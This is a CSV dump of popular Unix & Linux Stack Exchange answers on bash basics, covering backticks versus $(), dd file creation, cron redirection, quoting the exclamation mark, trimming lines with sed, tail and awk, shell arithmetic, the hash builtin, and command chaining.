Title,Id,Tags,Score,Body
"Have backticks (i.e. `cmd`) in *sh shells been deprecated?","126927","<bash><shell-script><shell><scripting><zsh>","135","<p>There are two different meanings of ""deprecated.""</p>

<blockquote>
  <p><strong>be deprecated:</strong> (chiefly of a software feature) be usable but regarded as obsolete and best avoided, typically due to having been superseded.</p>
  
  <p>—New Oxford American Dictionary</p>
</blockquote>

<p>By this definition backticks <em>are</em> deprecated.</p>

<blockquote>
  <p>Deprecated status <strong>may also</strong> indicate the feature will be removed in the future.</p>
  
  <p>—<a href=""https://en.wikipedia.org/wiki/Deprecation"" rel=""noreferrer"">Wikipedia</a></p>
</blockquote>

<p>By this definition backticks are <em>not</em> deprecated.</p>

<h3>Still supported:</h3>

<p>Citing the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_03"" rel=""noreferrer"">Open Group Specification on Shell Command Languages</a>,
specifically section ""2.6.3 Command Substitution,"" it can be seen that both forms of command substitution, backticks (<code>`..cmd..`</code>) or dollar parens (<code>$(..cmd..)</code>) are still supported insofar as the specification goes.</p>

<p><em>excerpt</em></p>

<blockquote>
  <p>Command substitution allows the output of a command to be substituted in place
  of the command name itself. Command substitution shall occur when the command
  is enclosed as follows:</p>

<pre><code>          $(command)

          or (backquoted version):

          `command`
</code></pre>
  
  <p>The shell shall expand the command substitution by executing command in a
  subshell environment (see Shell Execution Environment) and replacing the
  command substitution (the text of command plus the enclosing <code>$()</code> or
  backquotes) with the standard output of the command, removing sequences of one
  or more &lt;newline> characters at the end of the substitution. Embedded &lt;newline> characters before the end of the output shall not be removed; however, 
  they may be treated as field delimiters and eliminated during field splitting, 
  depending on the value of IFS and quoting that is in effect. If the output 
  contains any null bytes, the behavior is unspecified.</p>
  
  <p>Within the backquoted style of command substitution, <em>&lt;backslash></em> shall retain
  its literal meaning, except when followed by: '$', '<code>\`</code>', or <em>&lt;backslash></em>. The
  search for the matching backquote shall be satisfied by the first unquoted
  non-escaped backquote; during this search, if a non-escaped backquote is
  encountered within a shell comment, a here-document, an embedded command
  substitution of the <code>$(command)</code> form, or a quoted string, undefined results
  occur. A single-quoted or double-quoted string that begins, but does not end,
  within the ""<code>`...`</code>"" sequence produces undefined results.</p>
  
  <p>With the <code>$(command)</code> form, all characters following the open parenthesis to
  the matching closing parenthesis constitute the command. Any valid shell 
  script can be used for command, except a script consisting solely of
  re-directions which produces unspecified results.</p>
</blockquote>

<h3>So then why does everyone say that backticks have been deprecated?</h3>

<p>Because most of the use cases <strong><em>should</em></strong> be making use of the dollar parens form instead of backticks.  (Deprecated in the first sense above.)  Many of the most reputable sites (including U&amp;L) often state this as well, throughout, so it's sound advice.  This advice should not be confused with some non-existent plan to remove support for backticks from shells.</p>

<ul>
<li><p><a href=""http://mywiki.wooledge.org/BashFAQ/082"" rel=""noreferrer"">BashFAQ #082 - Why is $(...) preferred over &#96;...&#96; (backticks)?</a></p>

<p><em>excerpt</em></p>

<blockquote>
  <p><code>`...`</code> is the legacy syntax required by only the very oldest of
  non-POSIX-compatible bourne-shells. There are several reasons to always
  prefer the <code>$(...)</code> syntax:</p>
  
  <p>...</p>
</blockquote></li>
<li><p><a href=""http://wiki.bash-hackers.org/scripting/obsolete"" rel=""noreferrer"">Bash Hackers Wiki - Obsolete and deprecated syntax</a></p>

<p><em>excerpt</em></p>

<blockquote>
  <p>This is the older Bourne-compatible form of the <a href=""http://wiki.bash-hackers.org/syntax/expansion/cmdsubst"" rel=""noreferrer"">command substitution</a>.
  Both the <code>`COMMANDS`</code> and <code>$(COMMANDS)</code> syntaxes are specified by POSIX, 
  but the latter is <em>greatly</em> preferred, though the former is unfortunately 
  still very prevalent in scripts. New-style command substitutions are widely 
  implemented by every modern shell (and then some). The only reason for using 
  backticks is for compatibility with a real Bourne shell (like Heirloom). 
  Backtick command substitutions require special escaping when nested, and 
  examples found in the wild are improperly quoted more often than not. See: 
  <a href=""http://mywiki.wooledge.org/BashFAQ/082"" rel=""noreferrer"">Why is $(...) preferred over &#96;...&#96; (backticks)?</a>.</p>
</blockquote></li>
<li><p><a href=""http://pubs.opengroup.org/onlinepubs/9699919799/xrat/V4_xcu_chap02.html#tag_23_02_06_03"" rel=""noreferrer"">POSIX standard rationale</a></p>

<p><em>excerpt</em></p>

<blockquote>
  <p>Because of these inconsistent behaviors, the backquoted variety of command substitution is not recommended for new applications that nest command substitutions or attempt to embed complex scripts.</p>
</blockquote></li>
</ul>

<p><strong>NOTE:</strong> This third excerpt (above) goes on to show several situations where backticks simply won't work, but the newer dollar parens method does, beginning with the following paragraph:</p>

<blockquote>
  <p>Additionally, the backquoted syntax has historical restrictions on the contents of the embedded command. While the newer ""$()"" form can process any kind of valid embedded script, the backquoted form cannot handle some valid scripts that include backquotes. </p>
</blockquote>

<p>If you continue reading that section the failures are highlighted showing how they would fail using backticks, but do work using the newer dollar parens notation.</p>

<h3>Conclusions</h3>

<p>So it's preferable that you use dollar parens instead of backticks but you aren't actually using something that's been technically ""deprecated"" as in ""this will stop working entirely at some planned point.""</p>

<p>After reading all this you should have the take away that you're strongly encouraged to use dollar parens unless you <em>specifically</em> require compatibility with a real original non-POSIX Bourne shell.</p>
"
"Generate File of a certain size?","101332","<bash><command-line><files>","135","<p>You can use dd:</p>

<pre><code>dd if=/dev/zero of=output.dat  bs=24M  count=1
</code></pre>

<p>or</p>

<pre><code>dd if=/dev/zero of=output.dat  bs=1M  count=24
</code></pre>

<p>or, on Mac,</p>

<pre><code>dd if=/dev/zero of=output.dat  bs=1m  count=24
</code></pre>
"
"Is there any way to execute commands from history?","275053","<bash><command-history>","133","<p>In bash, just <code>!636</code> will be ok.</p>
"
"How to run a program in a clean environment in bash?","48994","<bash><environment-variables>","133","<p>You can do this with <code>env</code>:</p>

<pre><code>env -i your_command
</code></pre>

<p>Contrary to comments below, this <em>does</em> completely clear out the environment, but it does not prevent <code>your_command</code> setting new variables. In particular, running a shell will cause the <code>/etc/profile</code> to run, and the shell may have some built in settings also.</p>

<p>You can check this with:</p>

<pre><code>env -i env
</code></pre>

<p>i.e. wipe the environment and then print it. The output will be blank.</p>
"
"How to redirect output to a file from within cron?","52330","<bash><io-redirection><cron>","131","<p>I solved the problem. There are two ways:</p>

<p><strong>M1</strong></p>

<p>Change the redirection from <code>&amp;&gt;&gt;</code> to <code>2&gt;&amp;1</code>. So now <code>crontab -e</code> looks like</p>

<pre><code>*/1 * * * * /home/ranveer/vimbackup.sh &gt;&gt; /home/ranveer/vimbackup.log 2&gt;&amp;1
</code></pre>

<p><strong>I believe</strong> the above works because by default <code>cron</code> is using <code>sh</code> to run the task instead of <code>bash</code> so <code>&amp;&gt;&gt;</code> is not supported by <code>sh</code>.</p>

<p><strong>M2</strong></p>

<p>Change the default shell by adding <code>SHELL=/bin/bash</code> in the <code>crontab -e</code> file.</p>
"
"Can't use exclamation mark (!) in bash?","33339","<bash><quoting><special-characters>","130","<p>The exclamation mark is part of history expansion in bash.  To use it you need it enclosed in single quotes (eg: <code>'http://example.org/!132'</code>) or to directly escape it with a backslash (<code>\</code>) before the character (eg: <code>""http://example.org/\!132""</code>).</p>

<p>Note that in double quotes, a backslash before the exclam prevents history expansion, BUT the backslash is not removed in such a case.  So it's better to use single quotes, so you're not passing a literal backslash to <code>curl</code> as part of the URL.</p>
"
"How do I delete the first n lines of an ascii file using shell commands?","37790","<bash><shell-script><text-processing>","130","<p>As long as the file is not a symlink or hardlink, you can use sed, tail, or awk. Example below.</p>

<pre><code>$ cat t.txt
12
34
56
78
90
</code></pre>

<h2>sed</h2>

<pre><code>$ sed -e '1,3d' &lt; t.txt
78
90
</code></pre>

<p>You can also use sed in-place without a temp file: <code>sed -i -e 1,3d yourfile</code>. This won't echo anything, it will just modify the file in-place. If you don't need to pipe the result to another command, this is easier.</p>

<h2>tail</h2>

<pre><code>$ tail -n +4 t.txt
78
90
</code></pre>

<h2>awk</h2>

<pre><code>$ awk 'NR &gt; 3 { print }' &lt; t.txt
78
90
</code></pre>
"
"how can I add (subtract, etc.) two numbers with bash?","93029","<bash><scripting><variable>","126","<p><a href=""http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_06_04"" rel=""noreferrer"">Arithmetic in POSIX shells</a> is done with <code>$</code> and double parentheses <code>(( ))</code>:</p>

<pre><code>echo ""$(($num1+$num2))""
</code></pre>

<p>You can assign from that (sans <code>echo</code>):</p>

<pre><code>num1=""$(($num1+$num2))""
</code></pre>

<p>There is also <code>expr</code>:</p>

<pre><code>expr $num1 + $num2
</code></pre>

<p>In scripting <code>$(())</code> is preferable since it avoids a fork/execute for the <code>expr</code> command.</p>
"
"What is the purpose of the hash command?","86012","<bash><history>","125","<p><code>hash</code> is a bash built-in command. The hash table is a feature of <code>bash</code>  that prevents it from having to search <code>$PATH</code> every time you type a command by caching the results in memory. The table gets cleared on events that obviously invalidate the results (such as modifying <code>$PATH</code>)</p>

<p>The <code>hash</code> command is just how you interact with that system (for whichever reason you feel you need to).</p>

<p>Some use cases:</p>

<ul>
<li><p>Like you saw it prints out how many times you hit which commands if you type it with no arguments. This might tell you which commands you use most often.</p></li>
<li><p>You can also use it to remember executables in non-standard locations. </p></li>
</ul>

<p>Example:</p>

<pre><code>[root@policyServer ~]# hash -p /lol-wut/whoami whoami
[root@policyServer ~]# whoami
Not what you're thinking
[root@policyServer ~]# which whoami
/usr/bin/whoami
[root@policyServer ~]# /usr/bin/whoami
root
[root@policyServer ~]#
</code></pre>

<p>Which might be useful if you just have a single executable in a directory outside of <code>$PATH</code> that you want to run by just type the name instead of including everything in that directory (which would be the effect if you added it to <code>$PATH</code>).</p>

<p>An alias can usually do this as well, though and since you're modifying the current shell's behavior, it isn't mapped in programs you kick off. A symlink to the lone executable is probably the preferable option here. <code>hash</code> is one way of doing it.</p>

<ul>
<li>You can use it to un-remember file paths. This is useful if a new executable pops up in an earlier <code>PATH</code> directory or gets <code>mv</code>'d to somewhere else and you want to force bash to go out and find it again instead of the last place it remembers finding it. </li>
</ul>

<p>Example:</p>

<pre><code>[root@policyServer ~]# hash
hits    command
   1    /bin/ls
[root@policyServer ~]# cp /bin/ls /lol-wut
[root@policyServer ~]# hash
hits    command
   1    /bin/cp
   1    /bin/ls
[root@policyServer ~]# hash -d ls
[root@policyServer ~]# ls
default.ldif  newDIT.ldif  notes.txt  users.ldif
[root@policyServer ~]# hash
hits    command
   1    /bin/cp
   1    /lol-wut/ls
[root@policyServer ~]#
</code></pre>

<p>The <code>cp</code> command caused a new version of the <code>ls</code> executable to show up earlier in my <code>$PATH</code> but didn't trigger a purge of the hash table. I used <code>hash -d</code> to selectively purge the entry for <code>ls</code> from the hash table. Bash was then forced to look through <code>$PATH</code> again and when it did, it found it in the newer location (earlier in $PATH than it was running before).</p>

<p>You can selectively invoke this ""find new location of executable from <code>$PATH</code>"" behavior, though:</p>

<pre><code>[root@policyServer ~]# hash
hits    command
   1    /bin/ls
[root@policyServer ~]# hash ls
[root@policyServer ~]# hash
hits    command
   0    /lol-wut/ls
[root@policyServer ~]#
</code></pre>

<p>You'd mostly just want to do this if you wanted something out of the hash table and weren't 100% that you could logout and then back in successfully, or you wanted to preserve some modifications you've made to your shell.</p>

<p>To get rid of stale mappings, you can also do <code>hash -r</code> (or <code>export PATH=$PATH</code>) which effectively just purges bash's entire hash table. </p>

<p>There are lots of little situations like that. I don't know if I'd call it one of the ""most useful"" commands but it does have some use cases. </p>
"
"What is the difference between ""&&"" and "";"" when chaining commands","37069","<bash><shell>","124","<p>Assume there is <code>command1 &amp;&amp; command2</code>.</p>

<p>In this case <code>command2</code> will be executed if and only if <code>command1</code> returned zero exit status.</p>

<p><code>;</code> is just a command separator. Thus <code>command2</code> will be executed whatever <code>command1</code> returned.</p>

<pre><code>$&gt; [[ ""a"" = ""b"" ]] &amp;&amp; echo ok 

$&gt; [[ ""a"" = ""b"" ]]; echo ok 
ok
</code></pre>
"
